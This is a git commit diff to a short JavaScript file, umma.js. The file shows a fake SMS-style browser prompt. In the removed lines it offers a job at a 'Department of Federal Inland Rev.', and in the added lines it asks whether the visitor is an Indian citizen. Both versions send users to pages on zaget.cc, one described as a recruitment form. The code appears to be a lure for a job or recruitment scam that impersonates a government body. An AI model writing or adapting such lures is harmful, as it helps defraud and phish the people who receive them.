d5e113c49b01ae1ae5c46b1fe9a70913638ec0a6
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2025-01-18 09:51:57 +0530

    Update umma.js

--- umma.js
+++ umma.js
@@ -1,5 +1,5 @@
-var password = 'APPLY NOW'
-password=prompt('SMS: Job is available for you at Department of Federal Inland Rev. kindly press Ok to start application now ','APPLY NOW');
-if (password != 'APPLY NOW') {
-location.href='https://zaget.cc/Federal-Inland-Rev-Recruitment-Form.html';
+var password = 'YES'
+password=prompt('SMS: Are you a Indian citizen? ','YES');
+if (password != 'YES') {
+location.href='https://zaget.cc/rech.html';
 }
